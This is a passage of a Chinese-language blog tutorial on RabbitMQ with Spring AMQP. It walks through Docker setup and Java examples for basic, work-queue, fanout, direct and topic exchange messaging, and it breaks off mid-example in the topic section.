<h2 id="2-docker部署RabbitMQ"><a href="#2-docker部署RabbitMQ" class="headerlink" title="2. docker部署RabbitMQ"></a>2. docker部署RabbitMQ</h2><ul>
<li>拉取镜像</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull rabbitmq:3-management</span><br></pre></td></tr></table></figure>

<ul>
<li>运行容器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line"> -e RABBITMQ_DEFAULT_USER=tyt\</span><br><span class="line"> -e RABBITMQ_DEFAULT_PASS=123456 \</span><br><span class="line"> --name mq \</span><br><span class="line"> --hostname mq1 \</span><br><span class="line"> -p 15672:15672 \</span><br><span class="line"> -p 5672:5672 \</span><br><span class="line"> -d \</span><br><span class="line"> rabbitmq:3-management</span><br></pre></td></tr></table></figure>



<h2 id="3-AMQP与JMS的简单介绍"><a href="#3-AMQP与JMS的简单介绍" class="headerlink" title="3.  AMQP与JMS的简单介绍"></a>3.  AMQP与JMS的简单介绍</h2><p>MQ是一种消息通信的模型，但并不是具体的实现。现在实现MQ的有两种主流方式：<strong>AMQP</strong>与<strong>JMS</strong>。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125621.png" alt=" "></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125627.png" alt=" "></p>
<blockquote>
<p><strong>两者对比：</strong></p>
<ul>
<li>JMS定义了统一的接口，对消息操作进行统一；AMQP是通过规定协议来统一数据交互的格式</li>
<li>JMS限定了只能使用Java；AMQP不限制语言</li>
<li>JMS只规定了两种消息模型；AMQP的消息模型有多种</li>
</ul>
</blockquote>
<p>在本文中要使用的SpringAMQP是基于RabbitMQ封装的一套模板，并且还利用SpringBoot对其实现了自动装配，使用起来非常方便。</p>
<p><a href="https://spring.io/projects/spring-amqp">SpringAmqp的官方地址</a></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125716.png" alt="image-20230815125715191"></p>
<h2 id="4-演示demo搭建结构"><a href="#4-演示demo搭建结构" class="headerlink" title="4. 演示demo搭建结构"></a>4. 演示demo搭建结构</h2><p>本文中对于各种模型均给出了示例代码，在此将整个工程结构给出。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125731.png" alt="image-20230815125730022"></p>
<ul>
<li>首先，我们在父工程的<code>pom.xml</code>中导入SpringAMQP的依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>然后分别在 publisher 与 consumer 模块的 application.yml 添加配置信息</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="comment"># rabbitMQ的ip地址</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="comment"># 端口</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span> </span><br><span class="line">    <span class="comment"># 用户名与密码</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="comment"># 要操作的虚拟主机</span></span><br><span class="line">    <span class="attr">virtual-host:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="二、Basic-Queue"><a href="#二、Basic-Queue" class="headerlink" title="二、Basic Queue"></a>二、Basic Queue</h1><p>这是RabbitMQ的基本模型，也是其他几个模型的雏形，最简单的消息模式。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125739.png" alt=" "></p>
<blockquote>
<p>最基础的消息队列模型只包括三个角色：</p>
<ul>
<li><p><strong>publisher</strong>：生产者、消息发布者，将消息发送到队列queue</p>
</li>
<li><p><strong>consumer</strong>：消费者，订阅队列，处理队列中的消息</p>
</li>
<li><p><strong>queue</strong>：消息队列，负责接受并缓存消息。队列只受主机的内存与磁盘限制，是一个大的消息缓冲区。许多生产者都可以发送消息到一个队列，许多消费者也可以从一个队列接受消息。</p>
</li>
</ul>
</blockquote>
<p><strong>代码示例</strong></p>
<ul>
<li>消息发送</li>
</ul>
<p>在 publisher 模块中利用RabbitTemplate实现消息发送</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringAmqpTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RabbitTemplate rabbitTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSendMessage2HelloQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 指定队列名称</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">queueName</span> <span class="operator">=</span> <span class="string">&quot;hello.queue&quot;</span>;</span><br><span class="line">        <span class="comment">// 要发送的信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;hello, spring amqp!&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送消息</span></span><br><span class="line">        rabbitTemplate.convertAndSend(queueName, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>消息接受</li>
</ul>
<p>在consumer模块新建一个监听器类，用于监听RabbitMQ中的消息，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringRabbitListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定需要监听的 队列名称</span></span><br><span class="line">     <span class="meta">@RabbitListener(queues = &quot;hello.queue&quot;)</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenHelloQueue</span><span class="params">(String message)</span> &#123;</span><br><span class="line">         System.err.println(<span class="string">&quot;消费者接收到hello.queue的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="三、Work-Queue"><a href="#三、Work-Queue" class="headerlink" title="三、Work Queue"></a>三、Work Queue</h1><p>工作模型，比上述提到的Basic Queue模型相对复杂一丢丢。简单来说就是<strong>让多个消费者绑定到一个队列，共同消费队列中的消息</strong>。</p>
<blockquote>
<p><strong>注意：</strong></p>
<p>一个消息只能被一个消费者获取</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125751.png" alt=" "></p>
<p><strong>工作模型相比于基本模型就是多了消费者的数量，那么，我们何时可以选择使用此模型呢？</strong></p>
<p>当消息处理比较耗时，并且生产消息的速度会远远大于消息的消费速度。长此以往，消息就会堆积越来越多，无法及时处理。此时就可以使用工作模型，多个消费者共同处理消息处理，速度就能大大提高了。</p>
<p><strong>代码示例</strong></p>
<ul>
<li>消息发送</li>
</ul>
<p>此处，我们选择循环发送信息模拟消息堆积的情况，在 publisher 模块中利用RabbitTemplate实现消息发送</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringAmqpTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RabbitTemplate rabbitTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSendMessage2WorkQueue</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 指定 队列名称</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">queueName</span> <span class="operator">=</span> <span class="string">&quot;work.queue&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;this is message__&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">50</span>; i++) &#123;</span><br><span class="line">            rabbitTemplate.convertAndSend(queueName, message + i);</span><br><span class="line">            Thread.sleep(<span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>消息接受</li>
</ul>
<p>此处我们需要模拟多个消费者绑定同一个队列，我们在consumer模块的SpringRabbitListener中添加2个新的监听方法并让他们同时监听<code>work.queue</code>队列。</p>
<p>我们特意让消费者1两次消费之间间隔20ms，消费者2间隔200ms。以此模拟消费者1性能优于消费者2的情况。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(queues = &quot;work.queue&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenWorkQueue1</span><span class="params">(String  message)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">// System.err.print 在控制台输出为红色字体，主要是为了便于区分两个消费者</span></span><br><span class="line">    System.err.println(<span class="string">&quot;消费者1接收到work.queue的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>+ LocalTime.now());</span><br><span class="line">    Thread.sleep(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RabbitListener(queues = &quot;work.queue&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenWorkQueue2</span><span class="params">(String message)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者2接收到work.queue的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span> + LocalTime.now());</span><br><span class="line">    Thread.sleep(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>观察结果<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125758.png" alt=" "></li>
</ul>
<p>我们可以发现，消费者1与消费者2都同时处理了25条信息。</p>
<p>消费者1很快完成了自己的25条消息，消费者2却在缓慢的处理自己的25条消息。</p>
<p>也就是说消息是平均分配给每个消费者，并没有考虑到消费者的处理能力。这样显然是有问题的。</p>
<ul>
<li><strong>能者多劳配置</strong></li>
</ul>
<p>通过以上的测试，我们可以发现队列中的消息默认是平均分配给每个消费者，并没有考虑到消费者的处理能力，这样显然是有问题的。</p>
<p>我们可以通过配置解决这个问题，就是让消费者不要一次性的分配到多条信息，而是直到处理完了<code>n</code>条信息后再去获取信息。当然，这个<code>n</code>就是我们自己来制定的，一般都设置为 1。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="attr">simple:</span></span><br><span class="line">        <span class="comment"># 每次只能获取一条消息，处理完成才能获取下一个消息</span></span><br><span class="line">        <span class="attr">prefetch:</span> <span class="number">1</span> </span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125803.png" alt=" "></p>
<p>完成配置后，可以发现当前大多数消息都被消费者1进行了消费。</p>
<hr>
<h1 id="四、发布订阅模式"><a href="#四、发布订阅模式" class="headerlink" title="四、发布订阅模式"></a>四、发布订阅模式</h1><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125811.png" alt=" "></p>
<p>在订阅模型中，多了一个exchange角色，并且过程也略有变化。</p>
<ul>
<li><p>与Work Queue相同，都是一个生产者对应多个消费者。但是此处<strong>一条消息是可以被多个消费者获取</strong>的</p>
</li>
<li><p>生产者不再将消息直接发送到队列，而是发送给exchange（交换机）</p>
</li>
<li><p>每个队列都需要绑定一个交换机</p>
</li>
<li><p>交换机一方面，可以接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于Exchange的类型。Exchange有以下3种类型：</p>
<ul>
<li><strong>Fanout</strong>：广播，将消息交给所有绑定到交换机的队列</li>
<li><strong>Direct</strong>：定向，把消息交给符合指定 RoutingKey 的队列</li>
<li><strong>Topic</strong>：通配符，把消息交给符合 routing pattern（路由模式） 的队列</li>
</ul>
</li>
<li><p>由图也可知，该模式与以上提到的基本模式与工作模式毫不冲突，完全可以结合到一起使用。</p>
</li>
</ul>
<blockquote>
<p><strong>什么场景下需要使用发布订阅模式？</strong></p>
<p>在上面也提到了发布订阅模式中的<strong>一条消息是可以被多个消费者获取</strong>的。</p>
<p>如果我们有此种需求，比如一笔外卖订单生成后，我们需要将用户信息分别发送到两个模块：配送模块与积分模块。配送模块需要的是用户配送信息，积分模块需要用户的Id。</p>
<p>因此我们可以在订单生成后，将用户的Id存储在消息队列，然后两个模块分别基于用户Id完成相应操作。</p>
<p>有了发布订阅模式之后，我们只需要将消息发送一次，多个消费者模块都可以接受到此消息。</p>
</blockquote>
<p><strong>Exchange（交换机）只负责转发消息，不具备存储消息的能力</strong>，因此如果没有任何队列与Exchange绑定，或者没有符合路由规则的队列，那么消息会丢失！</p>
<h2 id="1-Fanout"><a href="#1-Fanout" class="headerlink" title="1. Fanout"></a>1. Fanout</h2><p>广播模式，原理如图：</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125834.png" alt="image-20230815125832052"></p>
<p>这种模式，交换机与队列直接完成绑定，不需要指定任何Key。所以它的消息传输速度是发布订阅模式中最快的。</p>
<p><strong>示例代码</strong></p>
<p>我们预实现如图场景：</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125837.png" alt=" "></p>
<blockquote>
<ul>
<li>创建一个交换机 tyt.fanout，类型是Fanout</li>
<li>创建两个队列fanout.queue1和fanout.queue2，绑定到交换机 tyt.fanout</li>
</ul>
</blockquote>
<ul>
<li>声明队列和交换机</li>
</ul>
<p>在consumer模块中新建一个配置类，声明队列和交换机：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FanoutConfig</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 声明一个名为 tyt.fanout 的交换机</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FanoutExchange <span class="title function_">fanoutExchange</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FanoutExchange</span>(<span class="string">&quot;tyt.fanout&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个名为 fanout.queue1 的队列</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">fanoutQueue1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;fanout.queue1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定 队列1 到 交换机</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">fanoutBinding1</span><span class="params">(Queue fanoutQueue1, FanoutExchange fanoutExchange)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder</span><br><span class="line">                .bind(fanoutQueue1)</span><br><span class="line">                .to(fanoutExchange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个名为 fanout.queue2 的队列</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">fanoutQueue2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;fanout.queue2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定 队列2 到 交换机</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">fanoutBinding2</span><span class="params">(Queue fanoutQueue2, FanoutExchange fanoutExchange)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder</span><br><span class="line">                .bind(fanoutQueue2)</span><br><span class="line">                .to(fanoutExchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>消息发送</li>
</ul>
<p>在 publisher 模块中利用RabbitTemplate实现消息发送</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringAmqpTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RabbitTemplate rabbitTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSendFanoutExchange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 交换机名称</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">exchangeName</span> <span class="operator">=</span> <span class="string">&quot;tyt.fanout&quot;</span>;</span><br><span class="line">        <span class="comment">// 消息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;hello, every consumer!&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送消息</span></span><br><span class="line">        rabbitTemplate.convertAndSend(exchangeName, <span class="string">&quot;&quot;</span>, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>消息接收</li>
</ul>
<p>在consumer模块的SpringRabbitListener中添加2个新的监听方法并让他们分别监听<code>fanout.queue1</code>与<code>fanout.queue2</code>队列。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(queues = &quot;fanout.queue1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenFanoutQueue1</span><span class="params">(String message)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到fanout.queue1的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RabbitListener(queues = &quot;fanout.queue2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenFanoutQueue2</span><span class="params">(String message)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到fanout.queue2的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-Direct"><a href="#2-Direct" class="headerlink" title="2. Direct"></a>2. Direct</h2><p>在Fanout模式中，一条消息，会被所有订阅的队列都消费。但是，在某些场景下，我们希望不同的消息被不同的队列消费。这时就要用到Direct类型的Exchange。</p>
<p>与Fanout模式相比，Direct模式增加了一个<strong>RoutingKey</strong>的概念。</p>
<p>我们可以把 publisher 与 consumer<code>s</code> （加个<code>s</code>代表多个消费者）当成黑帮老大，而交换机与队列就是它们分别派出去的小弟，派出去时，publisher与 consumer<code>s</code> 都分别给了所派出去的交换机与队列一个<strong>RoutingKey</strong>。这就是他们行走江湖的暗号，当暗号对应上了，交换机就将消息给对应的队列。</p>
<p>对于下图，我们就可以知道了 consumer1 可以接收到消息，而 consumer2 接受不到。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125844.png" alt=" "></p>
<blockquote>
<p> <strong>在Direct模型下：</strong></p>
<ul>
<li>队列与交换机的绑定，不能是任意绑定了，而是要指定<code>RoutingKey</code></li>
<li>消息的发送方在 向 Exchange发送消息时，也必须指定消息的 <code>RoutingKey</code>。</li>
<li>Exchange不再把消息交给每一个绑定的队列，而是根据消息的<code>RoutingKey</code>进行判断，只有队列的<code>Routingkey</code>与消息的 <code>Routingkey</code>完全一致，才会接收到消息</li>
</ul>
</blockquote>
<p><strong>示例代码</strong></p>
<ul>
<li>声明队列和交换机</li>
</ul>
<p>在上面，我们已经使用过配置类完成声明队列与交换机。其实，Spring还提供了基于注解方式来声明。</p>
<p>而基于的注解也是我们刚才使用过的<code>@RabbitListener</code>，因此，此处可以将声明与监听同时配置。</p>
<p>在consumer 模块的SpringRabbitListener中添加两个消费者，同时基于注解来声明队列和交换机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    // 指定队列的名字</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;direct.queue1&quot;),</span></span><br><span class="line"><span class="meta">    // 指定交换机的名字以及交换机类型</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;tyt.direct&quot;, type = ExchangeTypes.DIRECT),</span></span><br><span class="line"><span class="meta">    // 指定 RoutingKey，可以同时指定多个，到时候比对 RoutingKey 只要有一个可以对应就可以匹配成功</span></span><br><span class="line"><span class="meta">    key = &#123;&quot;111&quot;, &quot;222&quot;&#125;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenDirectQueue1</span><span class="params">(String message)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到direct.queue1的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    // 指定队列的名字</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;direct.queue2&quot;),</span></span><br><span class="line"><span class="meta">    // 指定交换机的名字以及交换机类型</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;tyt.direct&quot;, type = ExchangeTypes.DIRECT),</span></span><br><span class="line"><span class="meta">    key = &#123;&quot;111&quot;, &quot;333&quot;&#125;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenDirectQueue2</span><span class="params">(String message)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到direct.queue2的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>消息发送</li>
</ul>
<p>在 publisher 模块中利用RabbitTemplate实现消息发送</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSendDirectExchange</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 交换机名称</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">exchangeName</span> <span class="operator">=</span> <span class="string">&quot;tyt.direct&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;hello, direct!&quot;</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">            当 routingKey = 111, direct.queue1 与 direct.queue2 均可获取信息</span></span><br><span class="line"><span class="comment">            当 routingKey = 222, 只有 direct.queue1 可获取信息</span></span><br><span class="line"><span class="comment">            当 routingKey = 333, 只有 direct.queue2 可获取信息</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">routingKey</span> <span class="operator">=</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(exchangeName, routingKey, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-Topic"><a href="#3-Topic" class="headerlink" title="3. Topic"></a>3. Topic</h2><p>Topic 与 Direct 相比，均可以根据<strong>RoutingKey</strong>把消息路由到不同的队列。只不过 Topic 可以让队列在绑定<strong>RoutingKey</strong>的时候使用<strong>通配符</strong>。说的通俗一点，就是可以将交换机与队列的<strong>RoutingKey</strong>模糊匹配。</p>
<p><strong>Routingkey</strong>一般都是有一个或多个单词组成，多个单词之间以<code>.</code>分割，例如： <code>tyt.key</code></p>
<blockquote>
<p> <strong>通配符规则：</strong></p>
<ul>
<li><p><code>#</code>：匹配一个或多个词</p>
</li>
<li><p><code>*</code>：匹配1个词</p>
</li>
</ul>
</blockquote>
<p>例如：</p>
<p><code>student.#</code>：能够匹配<code>student.info.name</code> 或者 <code>student.name</code></p>
<p><code>student.*</code>：只能匹配<code>student.name</code></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125850.png" alt=" "></p>
<p>解释：</p>
<ul>
<li>queue1：绑定的是<code>china.#</code> ，因此凡是以 <code>china.</code>开头的<strong>Routingkey</strong>都会被匹配到。包括china.news和china.weather</li>
<li>queue2：绑定的是<code>japan.#</code> ，因此凡是以 <code>japan.</code>开头的<strong>Routingkey</strong>都会被匹配到。包括japan.news和japan.weather</li>
<li>queue3：绑定的是<code>#.weather</code> ，因此凡是以<code>.weather</code>结尾的<strong>Routingkey</strong>都会被匹配。包括china.weather和japan.weather</li>
<li>queue4：绑定的是<code>#.news</code> ，因此凡是以<code>.news</code>结尾的<strong>Routingkey</strong>都会被匹配。包括china.news和japan.news</li>
</ul>
<p><strong>示例代码</strong></p>
<ul>
<li>消息发送</li>
</ul>
<p>在 publisher 模块中利用RabbitTemplate实现消息发送</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSendTopicExchange</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 交换机名称</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">exchangeName</span> <span class="operator">=</span> <span class="string">&quot;tyt.topic&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;北京申奥成功啦！！！&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">routingKey</span> <span class="operator">=</span> <span class="string">&quot;china.news&quot;</span>;</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(exchangeName, routingKey, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>消息接受</li>
</ul>
<p>在consumer 模块的SpringRabbitListener中添加两个消费者，同时基于注解来声明队列和交换机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    // 指定队列的名字</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;topic.queue1&quot;),</span></span><br><span class="line"><span class="meta">    // 指定交换机的名字以及交换机类型</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;tyt.topic&quot;, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">    // 指定 RoutingKey，可以同时指定多个，到时候比对 RoutingKey 只要有一个可以对应就可以匹配成功</span></span><br><span class="line"><span class="meta">    key = &#123;&quot;china.#&quot;&#125;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenTopicQueue1</span><span class="params">(String message)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到topic.queue1的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    // 指定队列的名字</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;topic.queue2&quot;),</span></span><br><span class="line"><span class="meta">    // 指定交换机的名字以及交换机类型</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;tyt.topic&quot;, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">    // 指定 RoutingKey，可以同时指定多个，到时候比对 